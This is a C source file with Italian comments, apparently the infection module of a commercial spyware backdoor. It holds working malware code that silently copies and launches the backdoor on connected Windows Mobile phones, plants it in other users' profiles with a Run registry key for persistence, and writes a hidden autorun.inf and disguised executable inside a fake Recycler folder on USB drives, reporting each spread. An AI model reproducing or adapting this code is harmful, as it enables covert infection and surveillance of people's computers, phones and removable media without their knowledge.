BOOL bPM_PDAAgentStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
BOOL bPM_pdacp = FALSE; // Semaforo per l'uscita del thread per pda
BOOL bPM_sprcp = FALSE; // Semaforo per l'uscita del thread per spread
BOOL bPM_usbcp = FALSE; // Semafoto per l'uscita del thread per usb

HANDLE hPDAThread = NULL;
HANDLE hSpreadThread = NULL;
HANDLE hUSBThread = NULL;

BOOL infection_spread = FALSE;	// Deve fare spread?
BOOL infection_pda = FALSE;		// Deve infettare i telefoni?
BOOL infection_usb = FALSE;		// Deve infettare le USB?

BOOL one_user_infected = FALSE; // Infetta solo un utente in una run

#pragma pack(4)
typedef struct {
	BOOL infection_spread;
	BOOL infection_pda;
	BOOL infection_usb;
} infection_conf_struct;
#pragma pack()

typedef struct _RAPIINIT {
  DWORD cbSize;
  HANDLE heRapiInit;
  HRESULT hrRapiInit;
} RAPIINIT;

typedef struct _CE_FIND_DATA {
  DWORD dwFileAttributes;
  FILETIME ftCreationTime;
  FILETIME ftLastAccessTime;
  FILETIME ftLastWriteTime;
  DWORD nFileSizeHigh;
  DWORD nFileSizeLow;
  DWORD dwOID;
  WCHAR cFileName[MAX_PATH];
} CE_FIND_DATA, *LPCE_FIND_DATA;

typedef HRESULT (WINAPI *CeRapiInitEx_t) (RAPIINIT *);
typedef HRESULT (WINAPI *CeRapiUninit_t)(void);
typedef HANDLE (WINAPI *CeCreateFile_t)(LPCWSTR,DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE); 
typedef BOOL (WINAPI *CeWriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *CeReadFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *CeCloseHandle_t)(HANDLE);
typedef BOOL (WINAPI *CeCreateDirectory_t)(LPCWSTR, LPSECURITY_ATTRIBUTES);
typedef HANDLE (WINAPI *CeFindFirstFile_t)(LPCWSTR, LPCE_FIND_DATA);
typedef BOOL (WINAPI *CeFindNextFile_t)(HANDLE, LPCE_FIND_DATA);
typedef BOOL (WINAPI *CeDeleteFile_t)(LPCWSTR);
typedef BOOL (WINAPI *CeCreateProcess_t)(LPCWSTR, LPCWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *CeFindClose_t)(HANDLE);

CeFindFirstFile_t pCeFindFirstFile = NULL;
CeFindNextFile_t pCeFindNextFile = NULL;
CeRapiUninit_t pCeRapiUninit = NULL;
CeRapiInitEx_t pCeRapiInitEx = NULL;
CeCreateFile_t pCeCreateFile = NULL;
CeWriteFile_t pCeWriteFile = NULL;
CeReadFile_t pCeReadFile = NULL;
CeCloseHandle_t pCeCloseHandle = NULL;
CeCreateDirectory_t pCeCreateDirectory = NULL;
CeDeleteFile_t pCeDeleteFile = NULL;
CeCreateProcess_t pCeCreateProcess = NULL;
CeFindClose_t pCeFindClose = NULL;

extern void SetLoadKeyPrivs();

#define SPREAD_AGENT_SLEEP_TIME 2*60*60*1000  // Ogni 2 ore 
#define PDA_AGENT_SLEEP_TIME 5000 // Ogni 5 secondi controlla il PDA
#define USB_AGENT_SLEEP_TIME 2000 // Ogni 2 secondi controlla l'USB
#define PDA_LOG_DIR L"$MS313Mobile"
#define AUTORUN_BACKUP_NAME L"Autorun4.exe"
#define CONFIG_FILE_NAME L"cptm511.dql"
#define HIVE_MOUNT_POINT L"-00691\\"
#define MAX_USER_INFECTION_COUNT 250

///////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////// Infezione Mobile //////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////

BOOL RapiInit()
{
	static BOOL rapi_init = FALSE;
	HMODULE		hrapi;

	if (rapi_init)
		return TRUE;

	if (!(hrapi = LoadLibraryW(L"rapi.dll")))
		return FALSE;

	pCeWriteFile   = (CeWriteFile_t)GetProcAddress(hrapi, "CeWriteFile");
	pCeReadFile   = (CeReadFile_t)GetProcAddress(hrapi, "CeReadFile");
	pCeRapiInitEx  = (CeRapiInitEx_t)GetProcAddress(hrapi, "CeRapiInitEx");
	pCeRapiUninit  = (CeRapiUninit_t)GetProcAddress(hrapi, "CeRapiUninit");
	pCeCreateFile  = (CeCreateFile_t)GetProcAddress(hrapi, "CeCreateFile");
	pCeCloseHandle = (CeCloseHandle_t)GetProcAddress(hrapi, "CeCloseHandle");
	pCeCreateDirectory = (CeCreateDirectory_t)GetProcAddress(hrapi, "CeCreateDirectory");
	pCeFindFirstFile   = (CeFindFirstFile_t)GetProcAddress(hrapi, "CeFindFirstFile");
	pCeFindNextFile    = (CeFindNextFile_t)GetProcAddress(hrapi, "CeFindNextFile");
	pCeDeleteFile      = (CeDeleteFile_t)GetProcAddress(hrapi, "CeDeleteFile");
	pCeCreateProcess   = (CeCreateProcess_t)GetProcAddress(hrapi, "CeCreateProcess");
	pCeFindClose = (CeFindClose_t)GetProcAddress(hrapi, "CeFindClose");

	if (!pCeWriteFile || !pCeReadFile || !pCeRapiInitEx || !pCeRapiUninit || !pCeCreateFile || !pCeCreateProcess ||
		!pCeCloseHandle || !pCeCreateDirectory || !pCeFindFirstFile || !pCeFindNextFile || !pCeDeleteFile || !pCeFindClose) {
			FreeLibrary(hrapi);
			return FALSE;
	}

	rapi_init = TRUE;
	return TRUE;
}

#define RAPI_CONNECT_SLEEP_TIME 300
BOOL TryRapiConnect(DWORD dwTimeOut)
{
    HRESULT     hr = E_FAIL;
    RAPIINIT    riCopy;
	DWORD dwRapiInit = 0;
	DWORD count;

    ZeroMemory(&riCopy, sizeof(riCopy));
    riCopy.cbSize = sizeof(riCopy);

    hr = pCeRapiInitEx(&riCopy);
    if (!SUCCEEDED(hr))
		return FALSE;

	for (count=0; count<dwTimeOut; count+=RAPI_CONNECT_SLEEP_TIME) {
		if (bPM_pdacp) 
			break;
		dwRapiInit = FNC(WaitForSingleObject)(riCopy.heRapiInit, RAPI_CONNECT_SLEEP_TIME);
		if (WAIT_OBJECT_0 == dwRapiInit) {
			if (SUCCEEDED(riCopy.hrRapiInit))
				return TRUE;
		}
	}

	pCeRapiUninit();
	return FALSE;
}

void RapiDisconnect()
{
	pCeRapiUninit();
}

BOOL FindMemoryCard(WCHAR *mmc_name, DWORD len_in_word)
{
	CE_FIND_DATA cefd;
	HANDLE hfind;

	hfind = pCeFindFirstFile(L"*", &cefd);
	if (hfind == INVALID_HANDLE_VALUE)
		return FALSE;

	do {
		if ((cefd.dwFileAttributes & FILE_ATTRIBUTE_TEMPORARY) && 
			(cefd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			_snwprintf_s(mmc_name, len_in_word, _TRUNCATE, L"%s", cefd.cFileName);		
			pCeFindClose(hfind);
			return TRUE;
		}
	} while (pCeFindNextFile(hfind, &cefd));

	pCeFindClose(hfind);
	return FALSE;
}

BOOL CopyFileToPDAFromPC(char *source, WCHAR *dest)
{
	BYTE buffer[2048];
	DWORD nread, nwrite;
	HANDLE hdst, hsrc;

	hsrc = CreateFileA(source, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0);
	if (hsrc == INVALID_HANDLE_VALUE)
		return FALSE;

	hdst = pCeCreateFile(dest, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hdst == INVALID_HANDLE_VALUE) {
		CloseHandle(hsrc);
		return FALSE;
	}

	while (FNC(ReadFile)(hsrc, buffer, sizeof(buffer), &nread, NULL) && nread>0) 
		pCeWriteFile(hdst, buffer, nread, &nwrite, NULL);
		
	CloseHandle(hsrc);
	pCeCloseHandle(hdst);
	return TRUE;
}

BOOL CopyFileToPDAFromPDA(WCHAR *source, WCHAR *dest)
{
	BYTE buffer[2048];
	DWORD nread, nwrite;
	HANDLE hdst, hsrc;

	hsrc = pCeCreateFile(source, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0);
	if (hsrc == INVALID_HANDLE_VALUE)
		return FALSE;

	hdst = pCeCreateFile(dest, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hdst == INVALID_HANDLE_VALUE) {
		pCeCloseHandle(hsrc);
		return FALSE;
	}

	while (pCeReadFile(hsrc, buffer, sizeof(buffer), &nread, NULL) && nread>0) 
		pCeWriteFile(hdst, buffer, nread, &nwrite, NULL);
		
	pCeCloseHandle(hsrc);
	pCeCloseHandle(hdst);
	return TRUE;
}

BOOL PDAFilesPresent()
{
	HANDLE hfile;
	char check_path[_MAX_PATH];

	hfile = FNC(CreateFileA)(HM_CompletePath(H4_MOBCORE_NAME, check_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(hfile);
	hfile = FNC(CreateFileA)(HM_CompletePath(H4_MOBZOO_NAME, check_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(hfile);
	return TRUE;
}

BOOL IsPDAInfected(WCHAR *mmc_path)
{
	WCHAR check_name[MAX_PATH];
	CE_FIND_DATA cefd;
	HANDLE hfind;

	// Prima controlla se la backdoor gia' gira
	_snwprintf_s(check_name, MAX_PATH, _TRUNCATE, L"\\Windows\\%s\\%s", PDA_LOG_DIR, CONFIG_FILE_NAME);		
	hfind = pCeCreateFile(check_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);	
	if (hfind != INVALID_HANDLE_VALUE) {
		pCeCloseHandle(hfind);
		return TRUE;
	}

	// Poi controlla se non abbiamo gia' scritto il nostro autorun sulla MMC
	_snwprintf_s(check_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\autorun.zoo", mmc_path);		
	hfind = pCeCreateFile(check_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfind != INVALID_HANDLE_VALUE) {
		pCeCloseHandle(hfind);
		return TRUE;
	}

	return FALSE;
}

BOOL InfectPDA(WCHAR *mmc_path)
{
	char source_name[_MAX_PATH];
	WCHAR check_name[MAX_PATH], dest_name[MAX_PATH];
	HANDLE hfile;
	PROCESS_INFORMATION pi;

	// Controlla se c'e' un autorun da copiare
	_snwprintf_s(check_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\autorun.exe", mmc_path);		
	hfile = pCeCreateFile(check_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile != INVALID_HANDLE_VALUE) {
		pCeCloseHandle(hfile);
		_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\%s", mmc_path, AUTORUN_BACKUP_NAME);		
		if (!CopyFileToPDAFromPDA(check_name, dest_name))
			return FALSE;
	}

	// Crea la directory se gia' non c'e'
	_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577", mmc_path);	
	pCeCreateDirectory(dest_name, NULL);

	// Copia lo zoo
	_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\autorun.zoo", mmc_path);		
	if (!CopyFileToPDAFromPC(HM_CompletePath(H4_MOBZOO_NAME, source_name), dest_name)) {
		_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\%s", mmc_path, AUTORUN_BACKUP_NAME);		
		pCeDeleteFile(dest_name);
		return FALSE;
	}

	// Copia l'exe
	_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\autorun.exe", mmc_path);		
	if (!CopyFileToPDAFromPC(HM_CompletePath(H4_MOBCORE_NAME, source_name), dest_name)) {
		_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\%s", mmc_path, AUTORUN_BACKUP_NAME);		
		pCeDeleteFile(dest_name);
		_snwprintf_s(dest_name, MAX_PATH, _TRUNCATE, L"\\%s\\2577\\autorun.zoo", mmc_path);		
		pCeDeleteFile(dest_name);
		return FALSE;
	}

	// Cerca di lanciare l'exe
	pCeCreateProcess(dest_name, NULL, NULL, NULL, FALSE, 0, NULL, NULL, NULL, &pi);
	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
///////////////////////// Infezione Utenti //////////////////////////////////
/////////////////////////////////////////////////////////////////////////////

void ReadRegValue(HKEY hive, WCHAR *subkey, WCHAR *value, DWORD *type, WCHAR **buffer)
{
	DWORD size = NULL;
	HKEY hreg;

	if (type)
		*type = 0;

	if (buffer)
		*buffer = NULL;

	if (FNC(RegOpenKeyW)(hive, subkey, &hreg) != ERROR_SUCCESS)
		return;

	if (FNC(RegQueryValueExW)(hreg, value, NULL, type, NULL, &size) != ERROR_SUCCESS) {
		FNC(RegCloseKey)(hreg);
		return;
	}

	if (!buffer) {
		FNC(RegCloseKey)(hreg);
		return;
	}
	
	*buffer = (WCHAR *)calloc(size+2, 1);
	if (!(*buffer)) {
		FNC(RegCloseKey)(hreg);
		return;
	}

	if (FNC(RegQueryValueExW)(hreg, value, NULL, type, (LPBYTE)(*buffer), &size) != ERROR_SUCCESS) {
		FNC(RegCloseKey)(hreg);
		SAFE_FREE((*buffer));
		return;
	}

	FNC(RegCloseKey)(hreg);
}

BOOL RegEnumSubKey(HKEY hive, WCHAR *subkey, DWORD index, WCHAR **buffer) 
{
	BOOL ret_val = FALSE;
	WCHAR temp_buff[1024];
	DWORD size = NULL;
	*buffer = NULL;
	HKEY hreg = NULL;

	do {
		if (FNC(RegOpenKeyW)(hive, subkey, &hreg) != ERROR_SUCCESS)
			break;

		memset(temp_buff, 0, sizeof(temp_buff));
		if (FNC(RegEnumKeyW)(hreg, index, temp_buff, (sizeof(temp_buff)/sizeof(temp_buff[0]))-1) != ERROR_SUCCESS)
			break;

		if ( ! ( (*buffer) = (WCHAR *)calloc(wcslen(temp_buff)*2+2, sizeof(WCHAR)) ) )
			break;

		swprintf_s((*buffer), wcslen(temp_buff)+1, L"%s", temp_buff);
		ret_val = TRUE;
	} while(0);

	if (hreg)
		FNC(RegCloseKey)(hreg);

	return ret_val;
}

BOOL IsUserInfected(WCHAR *dest_dir)
{
	HANDLE hfile;
	WCHAR infection_path[MAX_PATH];
	WIN32_FIND_DATAW fdw;

	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4_CONF_FILE);
	hfile = FNC(FindFirstFileW)(infection_path, &fdw);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hfile);
	return TRUE;
}

void RollBackUser(WCHAR *dest_dir)
{
	WCHAR infection_path[MAX_PATH];
	
	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4DLLNAME);
	FNC(DeleteFileW)(infection_path);
	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4_CONF_FILE);
	FNC(SetFileAttributesW)(infection_path, FILE_ATTRIBUTE_NORMAL);
	FNC(DeleteFileW)(infection_path);
	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S", dest_dir, H4_HOME_DIR);
	FNC(RemoveDirectoryW)(infection_path);
}

BOOL InfectRegistry(WCHAR *dest_dir, WCHAR *home_dir, WCHAR *user_sid)
{
	WCHAR lc_key[MAX_PATH], uc_key[MAX_PATH], tmp_buf[MAX_PATH*2], hive_mp[MAX_PATH];
	HKEY hOpen;

	_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"%s\\NTUSER.DAT", home_dir);
	_snwprintf_s(hive_mp, sizeof(hive_mp)/sizeof(hive_mp[0]), _TRUNCATE, L"%s%s", user_sid, HIVE_MOUNT_POINT);
	if (FNC(RegLoadKeyW)(HKEY_LOCAL_MACHINE, hive_mp, tmp_buf) != ERROR_SUCCESS) 
		return FALSE;

#ifdef RUN_ONCE_KEY
	_snwprintf_s(lc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\Runonce", hive_mp);
	_snwprintf_s(uc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\RunOnce", hive_mp);
#else
	_snwprintf_s(lc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\Run", hive_mp);
	_snwprintf_s(uc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\Run", hive_mp);
#endif

	if (FNC(RegOpenKeyW)(HKEY_LOCAL_MACHINE, uc_key, &hOpen) != ERROR_SUCCESS &&
		FNC(RegOpenKeyW)(HKEY_LOCAL_MACHINE, lc_key, &hOpen) != ERROR_SUCCESS &&
		FNC(RegCreateKeyW)(HKEY_LOCAL_MACHINE, uc_key, &hOpen) != ERROR_SUCCESS)  {
		FNC(RegUnLoadKeyW)(HKEY_LOCAL_MACHINE, hive_mp);
		return FALSE;
	}
	
	// Path a rundll32.exe
	_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"%%SystemRoot%%\\system32\\rundll32.exe \"%s\\%S\\%S\",HFF8", dest_dir, H4_HOME_DIR, H4DLLNAME);
	_snwprintf_s(uc_key, sizeof(uc_key)/sizeof(uc_key[0]), _TRUNCATE, L"%S", REGISTRY_KEY_NAME);
	if (FNC(RegSetValueExW)(hOpen, uc_key, NULL, REG_EXPAND_SZ, (BYTE *)tmp_buf, (wcslen(tmp_buf)+1)*sizeof(WCHAR)) != ERROR_SUCCESS) {
		FNC(RegCloseKey)(hOpen);
		FNC(RegUnLoadKeyW)(HKEY_LOCAL_MACHINE, hive_mp);
		return FALSE;
	}
	
	FNC(RegCloseKey)(hOpen);
	FNC(RegUnLoadKeyW)(HKEY_LOCAL_MACHINE, hive_mp);
	return TRUE;
}

BOOL SpreadToUser(WCHAR *dest_dir, WCHAR *home_dir, WCHAR *user_sid)
{
	char temp_path[MAX_PATH];
	char *drv_scramb_name;
	WCHAR infection_path[MAX_PATH];
	WCHAR source_path[MAX_PATH];

	if (!dest_dir)
		return FALSE;

	if (IsUserInfected(dest_dir))
		return FALSE;

	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S", dest_dir, H4_HOME_DIR);
	FNC(CreateDirectoryW)(infection_path, NULL);

	_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(H4DLLNAME, temp_path));
	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4DLLNAME);
	if (!FNC(CopyFileW)(source_path, infection_path, FALSE)) {
		RollBackUser(dest_dir);
		return FALSE;
	}

	_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(H4_CONF_FILE, temp_path));
	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4_CONF_FILE);
	if (!FNC(CopyFileW)(source_path, infection_path, FALSE)) {
		RollBackUser(dest_dir);
		return FALSE;
	}

	if (!InfectRegistry(dest_dir, home_dir, user_sid)) {
		RollBackUser(dest_dir);
		return FALSE;
	}

	// Cerca di copiare il driver (se c'e')
	if (drv_scramb_name = LOG_ScrambleName(H4_DUMMY_NAME, 1, TRUE)) {
		_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(drv_scramb_name, temp_path));
		_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, drv_scramb_name);
		FNC(CopyFileW)(source_path, infection_path, FALSE);
		SAFE_FREE(drv_scramb_name);
	}

	// Cerca di copiare il codec (se c'e')
	_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(H4_CODEC_NAME, temp_path));
	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H4_CODEC_NAME);
	FNC(CopyFileW)(source_path, infection_path, FALSE);

	// Cerca di copiare la dll 64 (se c'e')
	_snwprintf_s(source_path, MAX_PATH, _TRUNCATE, L"%S", HM_CompletePath(H64DLL_NAME, temp_path));
	_snwprintf_s(infection_path, MAX_PATH, _TRUNCATE, L"%s\\%S\\%S", dest_dir, H4_HOME_DIR, H64DLL_NAME);
	FNC(CopyFileW)(source_path, infection_path, FALSE);

	return TRUE;
}

WCHAR *GetLocalSettings(WCHAR *tmp_dir)
{
	WCHAR *temp_string, *ptr;
	DWORD len;

	temp_string = _wcsdup(tmp_dir);
	if (!temp_string)
		return NULL;

	len = wcslen(temp_string); 
	if (len == 0)
		return temp_string;
	if (temp_string[len-1] == L'\\')
		temp_string[len-1] = 0;

	ptr = wcsrchr(temp_string, L'\\');
	if (ptr)
		*ptr = 0;
	return temp_string;
}

void InfectUsers()
{
	WCHAR tmp_buf[512];
	WCHAR *user_sid = NULL;
	WCHAR *user_home = NULL;
	WCHAR *user_temp = NULL;
	WCHAR *temp_home = NULL;
	WCHAR *tmp_ptr = NULL;
	WCHAR *user_name = NULL;
	DWORD i;
	
	for (i=0;;i++) {
		// Infetta un solo utente in una run
		if (one_user_infected)
			break;

		// Cicla i profili (tramite i sid)
		if (!RegEnumSubKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\", i, &user_sid))
			break;

		// E' un utente di sistema
		if (wcsncmp(user_sid, L"S-1-5-21-", wcslen(L"S-1-5-21-"))) {
			SAFE_FREE(user_sid);
			continue;
		}

		// Prende la home
		_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\%s\\", user_sid);
		ReadRegValue(HKEY_LOCAL_MACHINE, tmp_buf, L"ProfileImagePath", NULL, &user_home);
		if (!user_home) {
			SAFE_FREE(user_sid);
			continue;
		}
		ZeroMemory(tmp_buf, sizeof(tmp_buf));
		FNC(ExpandEnvironmentStringsW)(user_home, tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]));
		SAFE_FREE(user_home);
		if (! (user_home = wcsdup(tmp_buf)) ) {
			SAFE_FREE(user_sid);
			continue;
		}
	
		// Prende la Temp
		ReadRegValue(HKEY_CURRENT_USER, L"Environment\\", L"TEMP", NULL, &temp_home);		
		if (!temp_home) {
			ReadRegValue(HKEY_CURRENT_USER, L"Environment\\", L"TMP", NULL, &temp_home);		
			if (!temp_home) {
				SAFE_FREE(user_sid);
				SAFE_FREE(user_home);
				continue;
			}
		}

		if (!(tmp_ptr = wcschr(temp_home, L'\\')) || !(user_temp = _wcsdup(tmp_ptr))) {
			SAFE_FREE(user_sid);
			SAFE_FREE(temp_home);
			SAFE_FREE(user_home);
			continue;
		}
		
		_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"%s%s", user_home, user_temp);	
		tmp_ptr = GetLocalSettings(tmp_buf); // Ricava la directory LocalSettings partendo dalla TEMP
		if (SpreadToUser(tmp_ptr, user_home, user_sid)) {
			if ( user_name = wcsrchr(user_home, L'\\') ) {
				user_name++;
				_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"[Infection Agent]: Spread to %s", user_name);
				SendStatusLog(tmp_buf);	
			}
			one_user_infected = TRUE;
		}
		SAFE_FREE(tmp_ptr);

		SAFE_FREE(user_sid);
		SAFE_FREE(temp_home);
		SAFE_FREE(user_home);
		SAFE_FREE(user_temp);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////// Infezione USB //////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////

BOOL IsUSBInfected(WCHAR *drive_letter)
{
	WCHAR file_path[MAX_PATH];
	HANDLE hfile;

	_snwprintf_s(file_path, MAX_PATH, _TRUNCATE, L"%s\\autorun.inf", drive_letter);
	hfile = CreateFileW(file_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(hfile);
	return TRUE;
}

#define LOCALIZED_USB_AUTORUN "Open folder to view files"
#define LOCALIZED_USB_RECYCLE "Recycler"
#define LOCALIZED_USB_SID "S-1-5-21-4125489612-33920608401-12510794-1000"
#define DESKTOP_INI_STRING "[.ShellClassInfo]\r\nIconResource=%systemroot%\\system32\\SHELL32.dll,32\r\nIconFile=%systemRoot%\\system32\\SHELL32.dll\r\nIconIndex=32"

BOOL InfectUSB(WCHAR *drive_letter, char *rcs_name)
{
	char autorun_format[]="[Autorun]\r\nAction=%s\r\nIcon=%%systemroot%%\\system32\\shell32.dll,4\r\nShellexecute=.\\%s\\%s\\%s.exe";
	char autorun_string[512];
	WCHAR file_path[MAX_PATH];
	WCHAR recycle_path[MAX_PATH];
	WCHAR sid_path[MAX_PATH];
	WCHAR dini_path[MAX_PATH];
	char exe_file[MAX_PATH];
	char bd_path[MAX_PATH];
	HANDLE hfile;
	DWORD dummy;

	// Verifica che esista il file della backdoor
	HM_CompletePath(rcs_name, bd_path);
	hfile = CreateFile(bd_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(hfile);

	// Crea il file di autorun
	_snwprintf_s(file_path, MAX_PATH, _TRUNCATE, L"%s\\autorun.inf", drive_letter);
	hfile = CreateFileW(file_path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	_snprintf_s(autorun_string, sizeof(autorun_string), _TRUNCATE, autorun_format, LOCALIZED_USB_AUTORUN, LOCALIZED_USB_RECYCLE, LOCALIZED_USB_SID, rcs_name);
	WriteFile(hfile, autorun_string, strlen(autorun_string), &dummy, NULL);
	CloseHandle(hfile);
	SetFileAttributesW(file_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);	

	// Crea la RecycleBin
	_snwprintf_s(recycle_path, MAX_PATH, _TRUNCATE, L"%s\\%S", drive_letter, LOCALIZED_USB_RECYCLE);
	CreateDirectoryW(recycle_path, NULL);
	SetFileAttributesW(recycle_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
	_snwprintf_s(dini_path, MAX_PATH, _TRUNCATE, L"%s\\desktop.ini", recycle_path);
	hfile = CreateFileW(dini_path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hfile != INVALID_HANDLE_VALUE) {
		WriteFile(hfile, DESKTOP_INI_STRING, strlen(DESKTOP_INI_STRING), &dummy, NULL);
		CloseHandle(hfile);
	}
	SetFileAttributesW(dini_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

	// Crea il subfolder e ci copia il file
	_snwprintf_s(sid_path, MAX_PATH, _TRUNCATE, L"%s\\%S", recycle_path, LOCALIZED_USB_SID);
	CreateDirectoryW(sid_path, NULL);
	// ... e ci copia il file
	_snprintf_s(exe_file, sizeof(exe_file), _TRUNCATE, "%S\\%s.exe", sid_path, rcs_name);
	if (!CopyFile(bd_path, exe_file, FALSE)) {
		// Se non riesce a scrivere il file cancella tutto quello creato
		RemoveDirectoryW(sid_path);
		SetFileAttributesW(dini_path, FILE_ATTRIBUTE_NORMAL);
		DeleteFileW(dini_path);
		SetFileAttributesW(recycle_path, FILE_ATTRIBUTE_NORMAL);
		RemoveDirectoryW(recycle_path);
		SetFileAttributesW(file_path, FILE_ATTRIBUTE_NORMAL);
		DeleteFileW(file_path);
		return FALSE;
	}

	return TRUE;
}

///////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////


DWORD WINAPI MonitorNewUsersThread(DWORD dummy) 
{
	LOOP {
		if (infection_spread) {
			SetLoadKeyPrivs();
			InfectUsers();
		}
		CANCELLATION_SLEEP(bPM_sprcp, SPREAD_AGENT_SLEEP_TIME); 
	}
	return 0;
}

DWORD WINAPI MonitorPDAThread(DWORD dummy) 
{
	LOOP {
		WCHAR mmc_path[MAX_PATH];
		if (infection_pda && PDAFilesPresent() && TryRapiConnect(3000)) {
			if (FindMemoryCard(mmc_path, MAX_PATH) && !IsPDAInfected(mmc_path)) {
				if (InfectPDA(mmc_path)) {
					REPORT_STATUS_LOG("- WM SmartPhone Infection.......OK\r\n");
					SendStatusLog(L"[Infection Agent]: Spread to Mobile Device");	
				}
			}
			RapiDisconnect();
			CANCELLATION_SLEEP(bPM_pdacp, PDA_AGENT_SLEEP_TIME*2);
		}
		CANCELLATION_SLEEP(bPM_pdacp, PDA_AGENT_SLEEP_TIME);
	}
	return 0;
}

